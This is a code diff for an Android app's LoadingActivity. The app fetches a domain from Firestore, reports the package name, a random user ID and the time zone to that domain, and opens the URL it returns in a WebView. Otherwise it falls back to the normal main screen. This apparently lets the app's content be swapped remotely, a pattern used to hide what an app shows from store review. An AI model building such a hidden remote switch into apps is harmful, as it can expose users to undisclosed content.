@@ -31,8 +31,8 @@ class LoadingActivity : AppCompatActivity() {
     companion object {
         private const val SHARED_PREFS_NAME = "sharedPref"
         private const val KEY_URL = "finalUrl"
-        private const val KEY_FIRESTORE_URL_NULL = "isFirestoreUrlNullOrEmpty"
-        private const val KEY_FINAL_URL_EXIST = "isFinalUrlExist"
+        private const val KEY_IS_FIRESTORE_URL_NULL = "isFirestoreUrlNullOrEmpty"
+        private const val KEY_IS_FINAL_URL_EXIST = "isFinalUrlExist"
         private const val Collection_ID = "database"
         private const val Document_ID = "check"
         private const val Field = "link"
@@ -44,25 +44,24 @@ class LoadingActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_loading)
 
-        FirebaseAnalytics.getInstance(this)
-        FirebaseMessaging.getInstance().isAutoInitEnabled = true
-        sharedPreferences = getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE)
-
-        if (!isConnectedToInternet(this) || wasFirestoreUrlNullOrEmpty()) {
-            println("null/empty url ")
+        if (!isConnectedToInternet(this)) {
             openMainActivity()
-        }
-        else if (isFinalUrlExist()){
-            println("url exist")
-            openWebActivity()
         } else {
-            println("fetching final url")
-            fetchFinalUrl()
+            sharedPreferences = getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE)
+            if (wasFirestoreUrlNullOrEmpty()) {
+                openMainActivity()
+            } else if (isFinalUrlExist()) {
+                openWebActivity()
+            } else {
+                fetchFinalUrl()
+            }
         }
     }
 
 
     private fun fetchFinalUrl() {
+        FirebaseAnalytics.getInstance(this)
+        FirebaseMessaging.getInstance().isAutoInitEnabled = true
         val db = Firebase.firestore
         db.collection(Collection_ID).document(Document_ID).get().addOnSuccessListener { document ->
             if (document != null) {
@@ -71,9 +70,6 @@ class LoadingActivity : AppCompatActivity() {
                 caseEmptyFirebase()
             }
         }
-            .addOnFailureListener {
-                caseEmptyFirebase()
-            }
     }
 
     private fun handleFirebaseData(domain: String) {
@@ -83,39 +79,33 @@ class LoadingActivity : AppCompatActivity() {
             val packageName = packageName
             val userId = UUID.randomUUID().toString()
             val timeZone = getTimeZone()
-            val getr = "utm_source=google-play&utm_medium=organic"
+            val otherParams = "getr=utm_source=google-play&utm_medium=organic"
             val url =
-                "$domain/?packageid=$packageName&usserid=$userId&getz=$timeZone&getr=$getr"
-            sendHttpRequest(url)
+                "$domain/?packageid=$packageName&usserid=$userId&getz=$timeZone&$otherParams"
+            val request = Request.Builder()
+                .url(url)
+                .header("User-Agent", System.getProperty("http.agent") as String)
+                .build()
+            sendHttpRequest(request)
         }
     }
 
     @OptIn(DelicateCoroutinesApi::class)
-    private fun sendHttpRequest(urlString: String) {
+    private fun sendHttpRequest(request: Request) {
         GlobalScope.launch(Dispatchers.IO) {
             val client = OkHttpClient()
-
-            val request = Request.Builder()
-                .url(urlString)
-                .header("User-Agent", System.getProperty("http.agent") as String)
-                .build()
-            println("request: $request")
             try {
                 val response: Response = client.newCall(request).execute()
-                println("response: $response")
                 if (response.isSuccessful) {
                     val responseData = response.body?.string()
                     if (responseData != null) {
                         caseUrlFound(responseData)
-                    } else {
-                        caseEmptyFirebase()
                     }
                 } else {
                     caseEmptyFirebase()
                 }
             } catch (e: IOException) {
                 e.printStackTrace()
-                caseEmptyFirebase()
             }
         }
     }
@@ -136,13 +126,12 @@ class LoadingActivity : AppCompatActivity() {
 
     private fun caseUrlFound(url: String){
         setFinalUrl(url)
-        sharedPreferences.edit().putBoolean(KEY_FINAL_URL_EXIST, true).apply()
+        sharedPreferences.edit().putBoolean(KEY_IS_FINAL_URL_EXIST, true).apply()
         openWebActivity()
     }
 
     private fun caseEmptyFirebase(){
-        println("case empty firebase")
-        sharedPreferences.edit().putBoolean(KEY_FIRESTORE_URL_NULL, true).apply()
+        sharedPreferences.edit().putBoolean(KEY_IS_FIRESTORE_URL_NULL, true).apply()
         openMainActivity()
     }
 
@@ -155,11 +144,11 @@ class LoadingActivity : AppCompatActivity() {
     }
 
     private fun wasFirestoreUrlNullOrEmpty(): Boolean {
-        return sharedPreferences.getBoolean(KEY_FIRESTORE_URL_NULL, false)
+        return sharedPreferences.getBoolean(KEY_IS_FIRESTORE_URL_NULL, false)
     }
 
     private fun isFinalUrlExist(): Boolean {
-        return sharedPreferences.getBoolean(KEY_FINAL_URL_EXIST, false)
+        return sharedPreferences.getBoolean(KEY_IS_FINAL_URL_EXIST, false)
     }
 
     private fun isConnectedToInternet(context: Context): Boolean {
@@ -187,8 +176,9 @@ class LoadingActivity : AppCompatActivity() {
 
     private fun openWebActivity() {
         val url = getFinalUrl()
+        println("opening: $url")
         val intent = Intent(this, WebActivity::class.java)
-        intent.putExtra(WebActivity.EXTRA_URL, url)
+        intent.putExtra(WebActivity.URL, url)
         startActivity(intent)
         finish()
     }
